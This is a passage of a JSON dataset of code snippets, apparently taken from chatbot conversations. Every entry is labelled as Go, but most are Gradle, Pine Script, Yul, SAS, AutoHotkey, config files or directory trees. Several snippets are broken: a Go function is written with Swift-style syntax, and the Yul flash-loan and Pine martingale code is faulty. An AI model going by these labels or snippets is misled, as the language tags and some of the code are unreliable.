    "code": "#Requires AutoHotkey v2.0\nReq := Request(\"https://www.qobuz.com/us-en/search?q=grrexh0cewaeb\")\nMsgBox(Req.getAllResponseHeaders())\nreturn\n\nRequest(url) {\n    WebRequest := HttpRequest.Open(\"GET\", url)\n    WebRequest.Options.MaxAutoRedirects := 0 ; No redirects\n    WebRequest.Send()\n    Return WebRequest\n}",
    "filename": "565e775cde29b845312a4e573b8db134_1.go"
  },
  {
    "conversation_hash": "04572a82d4d2338fa93064136ffc2032",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func venderEnCorto() {\n   // Establecer un conjunto de criterios para decidir cuándo vender las acciones. Por ejemplo, si una acción cae un 5% en un día determinado se puede activar una venta en corto.\n   let porcentajeBajada: Float = 0.05 // Si una acción cae un 5% o más, considerar una venta en corto.\n   let precioAccionHoy: Float = 100.00 // Precio de la acción hoy\n   let precioAccionManana: Float = 90.00 // Precio de la acción mañana\n   \n   // Comprobar si el precio de la acción hoy es mayor que el precio de la acción mañana.\n   if precioAccionHoy - precioAccionManana >= porcentajeBajada*precioAccionHoy {\n       // Si la diferencia de precios es igual o mayor al porcentaje de bajada establecido, se activa la venta en corto.\n       realizarVentaEnCorto()\n   }\n}\n\nfunc realizarVentaEnCorto() {\n   // Aquí se puede implementar la lógica para vender en corto.\n   // Por ejemplo, se puede llamar una aplicación de corretaje en línea y vender automáticamente las acciones, siguiendo la estrategia de inversión establecida.\n}",
    "filename": "04572a82d4d2338fa93064136ffc2032_0.go"
  },
  {
    "conversation_hash": "ef098c618a1cf7aa1ca01fd7e6a352fa",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "global_defs {\n   router_id     LVS_DEVEL\n}\n\nvrrp_instance VI_1 {\n    state MASTER\n    interface eth0  # 配置虚拟IP绑定的网卡\n    virtual_router_id 51  # 虚拟路由ID，需要在同一组中的所有节点上保持一致\n    priority 101  # MASTER节点的优先级高于BACKUP节点\n    advert_int 1  # VRRP心跳包的发送间隔\n    virtual_ipaddress {\n        192.168.1.100/24  # 配置虚拟IP地址和掩码\n    }\n}\n\nvirtual_server 192.168.1.100 8080 {\n    delay_loop 6\n    lb_algo rr\n    lb_kind NAT\n    persistence_timeout 50\n    protocol TCP\n\n    # 配置服务的节点及端口\n    real_server 192.168.1.101 8080 {\n        weight 1\n        TCP_CHECK {\n          connect_timeout 10\n          nb_get_retry 3\n          delay_before_retry 3\n          connect_port 8080\n        }\n    }\n\n    real_server 192.168.1.102 8080 {\n        weight 3\n        TCP_CHECK {\n          connect_timeout 10\n          nb_get_retry 3\n          delay_before_retry 3\n          connect_port 8080\n        }\n    }\n}",
    "filename": "ef098c618a1cf7aa1ca01fd7e6a352fa_0.go"
  },
  {
    "conversation_hash": "a0c5886efeab3481252e292d28dfa0a7",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "├── src/\n│   ├── main.js\n│   ├── App.vue\n│   ├── assets/\n│   │   ├── css/\n│   │   └── img/\n│   ├── components/\n│   ├── modules/\n│   │   ├── ModuleA/\n│   │   │   ├── components/\n│   │   │   ├── views/\n│   │   │   ├── store/\n│   │   │   │   ├── index.js\n│   │   │   │   ├── actions.js\n│   │   │   │   ├── mutations.js\n│   │   │   │   ├── getters.js\n│   │   │   │   ├── state.js\n│   │   │   └── ModuleA.js\n│   │   └── ModuleB/\n│   │       ├── components/\n│   │       ├── views/\n│   │       ├── store/\n│   │       │   ├── index.js\n│   │       │   ├── actions.js\n│   │       │   ├── mutations.js\n│   │       │   ├── getters.js\n│   │       │   ├── state.js\n│   │       └── ModuleB.js\n│   ├── router/\n│   │   ├── index.js\n│   │   └── routes.js\n│   ├── store/\n│   │   ├── index.js\n│   ├── utils/\n│   └── plugins/\n│       ├── axios.js\n│       └── element-ui.js\n├── public/\n│   ├── index.html\n│   ├── favicon.ico\n│   └── manifest.json\n└── package.json",
    "filename": "a0c5886efeab3481252e292d28dfa0a7_4.go"
  },
  {
    "conversation_hash": "54512bbd88aa950e49dea434f28f7e39",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "dependencyResolutionManagement {\n    repositories {\n        google()\n        jcenter() // Change this to 'mavenCentral()' if you don't want to use jcenter\n        gradlePluginPortal()\n    }\n}",
    "filename": "54512bbd88aa950e49dea434f28f7e39_6.go"
  },
  {
    "conversation_hash": "f3242e55965ea3676cb451dca24fc4d1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Martingale Trading Strategy\", shorttitle=\"MTS\", overlay=true)\n\n// 输入参数\nmartingaleFactor = input(2, \"Martingale Factor\", minval=1)\nmovingAverageLength = input(50, \"Moving Average Length\")\ntradeSize = input(100, \"Initial Trade Size\")\n\n// 计算均线\nprice = close\nmovingAverage = sma(price, movingAverageLength)\n\n// 生成买卖信号\nenterLong = crossover(price, movingAverage)\nenterShort = crossunder(price, movingAverage)\n\n// 初始化与马丁格尔相关的变量\nvar float tradeCount = na\nvar float posSize = na\n\nif (enterLong or enterShort)\n    // 如果发出交易信号，则重置仓位和计数器\n    posSize := float(tradeSize)\n    tradeCount := 0\n\nisLong = false\nif fill(tradeCount < martingaleFactor, false)\n\n    if enterLong\n        strategy.entry(\"Long\", strategy.long)\n        tradeCount := tradeCount + 1\n        posSize := posSize * 2\n        isLong := true\n\n    if enterShort\n        strategy.entry(\"Short\", strategy.short)\n        tradeCount := tradeCount + 1\n        posSize := posSize * 2\n        isLong := false\n\nif isLong\n    strategy.close(\"Short\")  // 已发生多头交易信号，平空单\nelse\n    strategy.close(\"Long\")  // 已发生空头交易信号，平多单\n\n// 绘制均线和买卖信号\nplot(movingAverage, color=color.blue, linewidth=2)\nplotshape(enterLong, location=location.belowbar, color=color.green, size=size.small, style=shape.triangleup)\nplotshape(enterShort, location=location.abovebar, color=color.red, size=size.small, style=shape.triangledown)",
    "filename": "f3242e55965ea3676cb451dca24fc4d1_0.go"
  },
  {
    "conversation_hash": "f3242e55965ea3676cb451dca24fc4d1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Martingale Trading Strategy with Stop Loss\", shorttitle=\"MTS-SL\", overlay=true)\n\n// 输入参数\nmartingaleFactor = input(2, \"Martingale Factor\", minval=1)\nmovingAverageLength = input(50, \"Moving Average Length\")\ntradeSize = input(100, \"Initial Trade Size\")\n\natrLength = input(14, \"ATR Length\")\nstopLossFactor = input(2, \"Stop Loss Factor\", type=input.integer)\n\n// 计算均线\nprice = close\nmovingAverage = sma(price, movingAverageLength)\n\n// 计算 ATR\natr = atr(atrLength)\n\n// 生成买卖信号\nenterLong = crossover(price, movingAverage)\nenterShort = crossunder(price, movingAverage)\n\n// 初始化与马丁格尔相关的变量\nvar float tradeCount = na\nvar float posSize = na\n\nif (enterLong or enterShort)\n    // 如果发出交易信号，则重置仓位和计数器\n    posSize := float(tradeSize)\n    tradeCount := 0\n\nisLong = false\nif fill(tradeCount < martingaleFactor, false)\n\n    if enterLong\n        strategy.entry(\"Long\", strategy.long)\n        tradeCount := tradeCount + 1\n        posSize := posSize * 2\n        isLong := true\n\n    if enterShort\n        strategy.entry(\"Short\", strategy.short)\n        tradeCount := tradeCount + 1\n        posSize := posSize * 2\n        isLong := false\n\nif isLong\n    strategy.close(\"Short\")  // 已发生多头交易信号，平空单\nelse\n    strategy.close(\"Long\")  // 已发生空头交易信号，平多单\n    \n// 添加止损策略\nif isLong\n    strategy.exit(\"StopLoss Long\", \"Long\", stop=close - atr * stopLossFactor)\nelse\n    strategy.exit(\"StopLoss Short\", \"Short\", stop=close + atr * stopLossFactor)\n\n// 绘制均线和买卖信号\nplot(movingAverage, color=color.blue, linewidth=2)\nplotshape(enterLong, location=location.belowbar, color=color.green, size=size.small, style=shape.triangleup)\nplotshape(enterShort, location=location.abovebar, color=color.red, size=size.small, style=shape.triangledown)",
    "filename": "f3242e55965ea3676cb451dca24fc4d1_1.go"
  },
  {
    "conversation_hash": "cd3847b2cb22197065e846f4c4b30239",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "跑腿平台\n├──backend\n│   ├── src\n│   │   ├── main\n│   │   │   └── java\n│   │   │       └── com\n│   │   │           └── example\n│   │   │               └── runapp\n│   │   │                   ├── controller\n│   │   │                   ├── model\n│   │   │                   ├── repository\n│   │   │                   ├── service\n│   │   │                   └── RunappApplication.java\n│   │   └── resources\n│   │       ├── application.properties\n│   │       ├── static\n│   │       └── templates\n│   └── pom.xml\n└──frontend\n    ├── public\n    ├── src\n    │   ├── assets\n    │   ├── components\n    │   ├── pages\n    │   ├── App.vue\n    │   ├── main.js\n    │   ├── manifest.json\n    │   └── pages.json\n    ├── package.json\n    └── README.md",
    "filename": "cd3847b2cb22197065e846f4c4b30239_0.go"
  },
  {
    "conversation_hash": "95c9e3b74095d5eaaa4ccb0edf76431e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n     \"name\": \"Alice\",\n     \"age\": 25,\n     \"hobbies\": [\"reading\", \"gaming\", \"movies\"]\n   }",
    "filename": "95c9e3b74095d5eaaa4ccb0edf76431e_0.go"
  },
  {
    "conversation_hash": "95c9e3b74095d5eaaa4ccb0edf76431e",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "{\n     \"name\": \"Alice\",\n     \"age\": 25,\n     \"hobbies\": [\"reading\", \"gaming\", \"movies\"]\n   }",
    "filename": "95c9e3b74095d5eaaa4ccb0edf76431e_4.go"
  },
  {
    "conversation_hash": "75b180b74b9395e7bf40b92f711cbf89",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// Train the network\nlayer1_out = math.tanh(w1 * input_data)\nlayer2_out = math.tanh(w2 * layer1_out)\nlayer3_out = math.tanh(w3 * layer2_out)\nlayer4_out = math.tanh(w4 * layer3_out)\nlayer5_out = math.tanh(w5 * layer4_out)\nlayer6_out = math.tanh(w6 * layer5_out)\nlayer7_out = math.tanh(w7 * layer6_out)\nlayer8_out = math.tanh(w8 * layer7_out)\noutput_prediction = math.tanh(w9 * layer8_out)\n\n// Calculate error\nerror = target - output_prediction\n\n// Adjust weights\nw9_adj = w9 + learning_rate * error * layer8_out\nw8_adj = w8 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer7_out\nw7_adj = w7 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer6_out\nw6_adj = w6 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer5_out\nw5_adj = w5 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer4_out\nw4_adj = w4 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer3_out\nw3_adj = w3 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer2_out\nw2_adj = w2 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * layer1_out\nw1_adj = w1 + learning_rate * error * w9 * (1 - layer8_out * layer8_out) * transpose(input_data)\n\n// Return adjusted weights\n(\n    w1_adj,\n    w2_adj,\n    w3_adj,\n    w4_adj,\n    w5_adj,\n    w6_adj,\n    w7_adj,\n    w8_adj,\n    w9_adj\n)",
    "filename": "75b180b74b9395e7bf40b92f711cbf89_4.go"
  },
  {
    "conversation_hash": "d1db43c26cc3ce8813ae91e4e01e479b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id(\"org.gradle.plugin.development\") version \"0.7.0\"\n    id(\"com.android.library\")\n    id(\"kotlin\")\n}",
    "filename": "d1db43c26cc3ce8813ae91e4e01e479b_0.go"
  },
  {
    "conversation_hash": "181967212237985bc0720e7d16a424d3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    // 打开文本文件\n    file, err := os.Open(\"test.txt\")\n    if err != nil {\n        fmt.Println(\"打开文件出错:\", err)\n    }\n    defer file.Close()\n\n    // 创建一个 Scanner 对象来读取文件\n    scanner := bufio.NewScanner(file)\n\n    // 按行循环读取文本内容\n    for scanner.Scan() {\n        fmt.Println(scanner.Text())\n    }\n\n    // 检查读取过程中是否有错误发生\n    if err := scanner.Err(); err != nil {\n        fmt.Println(\"读取文件出错:\", err)\n    }\n}",
    "filename": "181967212237985bc0720e7d16a424d3_0.go"
  },
  {
    "conversation_hash": "f104f58c7be2733a524a03530a10e634",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "void func(int& x) {\n    x = 10;\n}\n\nint main() {\n    int num = 5;\n    func(num); // num现在等于10\n    return 0;\n}",
    "filename": "f104f58c7be2733a524a03530a10e634_2.go"
  },
  {
    "conversation_hash": "4ef7d8de42fcb7fdf96a98e6ddfecaed",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id \"com.example.myplugin\" version \"1.0.0\"\n}\n\n// 或者，如果您的插件不是 Gradle 插件：\n\nbuildscript {\n    dependencies {\n        classpath \"com.example:myplugin:1.0.0\"\n    }\n}",
    "filename": "4ef7d8de42fcb7fdf96a98e6ddfecaed_0.go"
  },
  {
    "conversation_hash": "6f7f589308ee7c2e35ae589e39657b86",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "object \"FlashLoanYul\" {\n    code {\n        let _calldata_size := returndatasize() ; get calldata length\n\n        mstore(0x0, _calldata_size) ; store size at memory position 0\n        calldatacopy(0x20, 0x0, _calldata_size) ; copy calldata to memory\n\n        let _address_aave_lending_pool := 0x0000000000 ; update with Aave LendingPool address\n        let _data_size := add(_calldata_size, 0x20)\n        let _value := callvalue()\n        call(gas(), _address_aave_lending_pool, _value, 0x0, _data_size, 0x0, 0x20)\n\n        returndatacopy(0x0, 0x0, returndatasize())\n        return(0x0, returndatasize())\n    }\n    object \"ABI\" { code {} }\n}",
    "filename": "6f7f589308ee7c2e35ae589e39657b86_3.go"
  },
  {
    "conversation_hash": "a14819708d3335fc0ff400cb79f2b9b1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "distributionUrl=https\\://services.gradle.org/distributions/gradle-7.1.1-bin.zip\n\ndependencies {\n    classpath(\"com.android.tools.build:gradle:7.0.4\")\n    classpath(\"com.google.dagger:hilt-android-gradle-plugin:2.38.1\")\n}",
    "filename": "a14819708d3335fc0ff400cb79f2b9b1_1.go"
  },
  {
    "conversation_hash": "a14819708d3335fc0ff400cb79f2b9b1",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "versionCatalogs {\n    create(\"libs\") {\n         ...\n         kotlinx_serialization_core = \"org.jetbrains.kotlinx:kotlinx-serialization-core:1.3.0\"\n         kotlinx_serialization_json = \"org.jetbrains.kotlinx:kotlinx-serialization-json:1.3.0\"\n         ...\n    }\n}",
    "filename": "a14819708d3335fc0ff400cb79f2b9b1_9.go"
  },
  {
    "conversation_hash": "1d345e478d36e8f6b314f987a3ac81d5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n  let _factory := calldataload(0x04)\n  let _sushiRouter := calldataload(0x24)\n  let _sender := calldataload(0x44)\n  let _amount0 := calldataload(0x64)\n  let _amount1 := calldataload(0x84)\n\n  // Check if _amount0 or _amount1 is zero\n  if eq(_amount0, 0) {\n    if eq(_amount1, 0) {\n      invalid()\n    }\n  }\n  if eq(_amount1, 0) {\n    if eq(_amount0, 0) {\n      invalid()\n    }\n  }\n\n  // Determine token addresses\n  let token0 := call(5000, 0x80, 0, add(0x20, 0x24), 0x20, 0x40, 0x20)\n  let token1 := call(5000, 0x80, 0, add(0x20, 0x44), 0x20, 0x60, 0x20)\n\n  // Declare variables for path[]\n  let path0\n  let path1\n\n  // Check which amount is zero and build path[]\n  if eq(_amount0, 0) {\n    path0 := token1\n    path1 := token0\n  }\n  if eq(_amount1, 0) {\n    path0 := token0\n    path1 := token1\n  }\n\n  // Declare variables for other operations\n  let deadline\n  let amountToken\n  let amountRequired\n  let amountReceived\n\n  // Perform token approval, swapping and token transfer operations\n  // Code for these operations is omitted due to complexity and difference between Solidity and Yul\n}",
    "filename": "1d345e478d36e8f6b314f987a3ac81d5_0.go"
  },
  {
    "conversation_hash": "25de30e8ad6038be0e696e1c7d36a437",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func parseTotalResult(result *redis.StringCmd) (float64, error) {\n\tstr, err := result.Result() // Changed to Result() to get the raw string\n\tif errors.Is(err, redis.Nil) {\n\t\treturn 0, nil\n\t} else if err != nil {\n\t\treturn 0, fmt.Errorf(\"failed getting result string: %w\", err)\n\t}\n\n\tx, err := strconv.ParseFloat(str, 64) // Use strconv.ParseFloat, since we already have the string\n\tif err != nil {\n\t\treturn 0, fmt.Errorf(\"failed converting result to Float64: %w\", err)\n\t}\n\n\treturn x, nil\n}\n\nfunc parseDailyResult(result *redis.StringCmd) (float64, error) {\n\tstr, err := result.Result() // Changed to Result() to get the raw string\n\tif errors.Is(err, redis.Nil) {\n\t\treturn 0, nil\n\t} else if err != nil {\n\t\treturn 0, fmt.Errorf(\"failed getting daily result string: %w\", err)\n\t}\n\n\tx, err := strconv.ParseFloat(str, 64) // Use strconv.ParseFloat, since we already have the string\n\tif err != nil {\n\t\treturn 0, fmt.Errorf(\"failed converting daily result to Float64: %w\", err)\n\t}\n\n\treturn x, nil\n}",
    "filename": "25de30e8ad6038be0e696e1c7d36a437_0.go"
  },
  {
    "conversation_hash": "1af58ffbec7725bf40a30c9fdd669dd0",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "[\n    {\n        \"levelNumber\": 1,\n        \"gridSize\": 8,\n        \"movesLimit\": 20,\n        \"obstacleTypes\": [0, 1],\n        \"obstacleSpawnRate\": 0.15\n    },\n    {\n        \"levelNumber\": 2,\n        \"gridSize\": 8,\n        \"movesLimit\": 25,\n        \"obstacleTypes\": [1, 2],\n        \"obstacleSpawnRate\": 0.20\n    },\n    {\n        \"levelNumber\": 3,\n        \"gridSize\": 9,\n        \"movesLimit\": 30,\n        \"obstacleTypes\": [0, 1, 2],\n        \"obstacleSpawnRate\": 0.25\n    }\n]",
    "filename": "1af58ffbec7725bf40a30c9fdd669dd0_4.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"time\"\n)\n\ntype User struct {\n\tID        int64\n\tUsername  string\n\tEmail     string\n\tPassword  string // This should be hashed before storing.\n\tCreatedAt time.Time\n\tUpdatedAt time.Time\n}\n\ntype File struct {\n\tID          int64\n\tOwnerID     int64 // User who uploaded the file.\n\tFilename    string\n\tFileSize    int64\n\tContentType string\n\tFilePath    string\n\tDownloadURL string\n\tCreatedAt   time.Time\n\tUpdatedAt   time.Time\n}",
    "filename": "4e96630506fb978983fde9b866c38623_0.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"time\"\n)\n\ntype User struct {\n\tID        int64\n\tUsername  string\n\tEmail     string\n\tPassword  string // This should be hashed before storing.\n\tCreatedAt time.Time\n\tUpdatedAt time.Time\n}\n\ntype File struct {\n\tID          int64\n\tOwnerID     int64 // User who uploaded the file.\n\tFilename    string\n\tFileSize    int64\n\tContentType string\n\tFilePath    string\n\tDownloadURL string\n\tPremium     bool\n\tCreatedAt   time.Time\n\tUpdatedAt   time.Time\n}\n\ntype Plan struct {\n\tID          int64\n\tName        string\n\tDescription string\n\tPrice       float64\n\tPremiumFilesLimit int\n\tCreatedAt   time.Time\n\tUpdatedAt   time.Time\n}\n\ntype UserPlan struct {\n\tID        int64\n\tUserID    int64\n\tPlanID    int64\n\tStartDate time.Time\n\tEndDate   time.Time\n\tCreatedAt time.Time\n\tUpdatedAt time.Time\n}",
    "filename": "4e96630506fb978983fde9b866c38623_1.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"filelynk/config\"\n\t\"filelynk/internal\"\n\t\"filelynk/repository\"\n\t\"filelynk/service\"\n\t\"fmt\"\n)\n\nfunc main() {\n\t// Load configuration\n\tconfig.Load()\n\n\t// Initialize database connection\n\tdb, err := internal.ConnectPostgreSQL()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to connect to the database:\", err)\n\t\treturn\n\t}\n\tdefer db.Close()\n\n\t// Initialize repositories\n\tuserRepo := repository.NewUserRepository(db)\n\tfileRepo := repository.NewFileRepository(db)\n\tplanRepo := repository.NewPlanRepository(db)\n\tuserPlanRepo := repository.NewUserPlanRepository(db)\n\n\t// Initialize services\n\tuserService := service.NewUserService(userRepo)\n\tfileService := service.NewFileService(fileRepo, userPlanRepo)\n\tplanService := service.NewPlanService(planRepo)\n\n\t// Application logic goes here, e.g., HTTP server, user registration & authentication, etc.\n}",
    "filename": "4e96630506fb978983fde9b866c38623_3.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "// Example for user.go in the repository package\npackage repository\n\nimport (\n\t\"filelynk/domain\"\n\t\"gorm.io/gorm\"\n)\n\ntype UserRepository interface {\n\tFindByID(id int64) (*domain.User, error)\n\t// ... Other repository methods ...\n}\n\ntype userRepositoryImpl struct {\n\tdb *gorm.DB\n}\n\nfunc NewUserRepository(db *gorm.DB) UserRepository {\n\treturn &userRepositoryImpl{db: db}\n}\n\nfunc (u *userRepositoryImpl) FindByID(id int64) (*domain.User, error) {\n\tvar user domain.User\n\terr := u.db.First(&user, id).Error\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn &user, nil\n}\n\n// Implement other repository methods...",
    "filename": "4e96630506fb978983fde9b866c38623_5.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "// Example for user.go in the service package\npackage service\n\nimport (\n\t\"filelynk/domain\"\n\t\"filelynk/repository\"\n)\n\ntype UserService interface {\n\tGetUser(id int64) (*domain.User, error)\n\t// ... Other service methods ...\n}\n\ntype userServiceImpl struct {\n\tuserRepo repository.UserRepository\n}\n\nfunc NewUserService(userRepo repository.UserRepository) UserService {\n\treturn &userServiceImpl{userRepo: userRepo}\n}\n\nfunc (u *userServiceImpl) GetUser(id int64) (*domain.User, error) {\n\tuser, err := u.userRepo.FindByID(id)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn user, nil\n}\n\n// Implement other service methods...",
    "filename": "4e96630506fb978983fde9b866c38623_6.go"
  },
  {
    "conversation_hash": "4e96630506fb978983fde9b866c38623",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package internal\n\nimport (\n\t\"filelynk/config\"\n\t\"filelynk/domain\"\n\t\"fmt\"\n\t\"gorm.io/driver/postgres\"\n\t\"gorm.io/gorm\"\n)\n\nfunc ConnectPostgreSQL() (*gorm.DB, error) {\n\tdsn := fmt.Sprintf(\"host=%s user=%s password=%s dbname=%s port=%s sslmode=%s TimeZone=%s\",\n\t\tconfig.PostgresHost,\n\t\tconfig.PostgresUser,\n\t\tconfig.PostgresPassword,\n\t\tconfig.PostgresDatabase,\n\t\tconfig.PostgresPort,\n\t\tconfig.PostgresSSLMode,\n\t\tconfig.PostgresTimeZone,\n\t)\n\tdb, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\t// Migrate your schema\n\terr = db.AutoMigrate(&domain.User{}, &domain.File{}, &domain.Plan{}, &domain.UserPlan{})\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn db, nil\n}",
    "filename": "4e96630506fb978983fde9b866c38623_7.go"
  },
  {
    "conversation_hash": "5a0f427ac523650dfbbdb070859947a7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "allprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}\n\ndependencies {\n    implementation \"com.android.support:appcompat-v7:${supportLibVersion}\"\n    implementation \"org.jetbrains.kotlin:kotlin-stdlib-jdk7:$kotlin_version\"\n    implementation \"com.google.android.material:material:${materialVersion}\"\n    implementation \"com.google.guava:guava:${guavaVersion}\"\n    implementation \"com.google.code.gson:gson:${gsonVersion}\"\n    implementation \"com.squareup.okhttp3:okhttp:${okhttpVersion}\"\n    implementation \"com.jakewharton.timber:timber:${timberVersion}\"\n\n    implementation(\"com.google.android.exoplayer:exoplayer-core:${exoPlayerVersion}\")\n    implementation(\"com.google.android.exoplayer:exoplayer-ui:${exoPlayerVersion}\")\n\n    implementation(\"com.google.android.obbdownloader:downloader:${downloaderVersion}\")\n    implementation(\"com.google.android.obbdownloader:downloader-impl:${downloaderVersion}\")\n    implementation(\"com.google.android.obbdownloader:zipfile:${downloaderVersion}\")\n    implementation(\"de.greenrobot:eventbus:${eventBusVersion}\")\n}",
    "filename": "5a0f427ac523650dfbbdb070859947a7_0.go"
  },
  {
    "conversation_hash": "7bef4d0e865d821f0b537e02841c6a43",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "s, ok := m[\"key\"].(string)\nif ok {\n    // 将 s 用作 string 类型的变量\n} else {\n    // m[\"key\"] 的值不是 string 类型\n}",
    "filename": "7bef4d0e865d821f0b537e02841c6a43_0.go"
  },
  {
    "conversation_hash": "0f73b4c06511d8374a8760219ecf1a1e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Transaction struct {\n\tID          int\n\tType        string // \"income\" or \"expense\"\n\tDescription string\n\tAmount      float64\n\tCategory    string\n\tDate        time.Time\n}",
    "filename": "0f73b4c06511d8374a8760219ecf1a1e_0.go"
  },
  {
    "conversation_hash": "0f73b4c06511d8374a8760219ecf1a1e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Assumes a persistence mechanism like a database\nfunc createTransaction(t Transaction) error {...}\nfunc getTransactions() ([]Transaction, error) {...}\nfunc updateTransaction(t Transaction) error {...}\nfunc deleteTransaction(id int) error {...}",
    "filename": "0f73b4c06511d8374a8760219ecf1a1e_1.go"
  },
  {
    "conversation_hash": "0f73b4c06511d8374a8760219ecf1a1e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/transactions\", transactionsHandler)\n\thttp.HandleFunc(\"/transactions/create\", createTransactionHandler)\n\thttp.HandleFunc(\"/transactions/update\", updateTransactionHandler)\n\thttp.HandleFunc(\"/transactions/delete\", deleteTransactionHandler)\n\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nfunc transactionsHandler(w http.ResponseWriter, r *http.Request) {...}\nfunc createTransactionHandler(w http.ResponseWriter, r *http.Request) {...}\nfunc updateTransactionHandler(w http.ResponseWriter, r *http.Request) {...}\nfunc deleteTransactionHandler(w http.ResponseWriter, r *http.Request) {...}",
    "filename": "0f73b4c06511d8374a8760219ecf1a1e_2.go"
  },
  {
    "conversation_hash": "4fefd2e05b92024083e3c05f9bbee8e6",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "%let numeric_var = 20220501;\n%let date_var = %sysfunc(putn(%sysfunc(inputn(&numeric_var., yymmdd8.)), yymmn6.));\n\n/* 计算前一个月 */\n%let prev_month = %sysfunc(putn(%sysfunc(intnx(month, %sysfunc(inputn(&date_var., yymmn6.)), -1), yymmn6.)), yymmn6.);\n\n/* 计算后一个月 */\n%let next_month = %sysfunc(putn(%sysfunc(intnx(month, %sysfunc(inputn(&date_var., yymmn6.)), 1), yymmn6.)), yymmn6.);\n\n/* 输出 */\n%put 前一个月：&prev_month;\n%put 当前月：&date_var;\n%put 后一个月：&next_month;",
    "filename": "4fefd2e05b92024083e3c05f9bbee8e6_10.go"
  },
  {
    "conversation_hash": "4fefd2e05b92024083e3c05f9bbee8e6",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "%let date_var = '202205';\n\n/* 加一个月 */\n%let next_month = %sysfunc(putn(%sysfunc(intnx(month, %sysfunc(inputn(&date_var., yymmn6.)), 1), yymmn6.)), yymmn6.);\n\n%put &next_month;",
    "filename": "4fefd2e05b92024083e3c05f9bbee8e6_12.go"
  },
  {
    "conversation_hash": "4c8071ac62cbfe9a2540dd139bfe8e24",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    mavenCentral()\n    maven {\n        name = \"forge\"\n        url = \"http://files.minecraftforge.net/maven\"\n    }\n}\n\ndependencies {\n    compileOnly \"net.minecraftforge:forge:1.14.4-28.1.4\"\n}",
    "filename": "4c8071ac62cbfe9a2540dd139bfe8e24_5.go"
  },
  {
    "conversation_hash": "6a525fdedd40d7838d6c6ae68c8390bb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"Vegetables\": [\n    {\n      \"Name\": \"Onions\",\n      \"Type\": \"Alliums\"\n    },\n    {\n      \"Name\": \"Garlic\",\n      \"Type\": \"Alliums\"\n    },\n    {\n      \"Name\": \"Broccoli\",\n      \"Type\": \"Brassicas\"\n    },\n    {\n      \"Name\": \"Cauliflower\",\n      \"Type\": \"Brassicas\"\n    },\n    {\n      \"Name\": \"Tomatoes\",\n      \"Type\": \"Nightshades\"\n    },\n    {\n      \"Name\": \"Potatoes\",\n      \"Type\": \"Nightshades\"\n    },\n    {\n      \"Name\": \"Spinach\",\n      \"Type\": \"Leafy greens\"\n    },\n    {\n      \"Name\": \"Carrots\",\n      \"Type\": \"Root vegetables\"\n    },\n    {\n      \"Name\": \"Zucchini\",\n      \"Type\": \"Squash and gourds\"\n    },\n    {\n      \"Name\": \"Beans\",\n      \"Type\": \"Legumes\"\n    }\n  ]\n}",
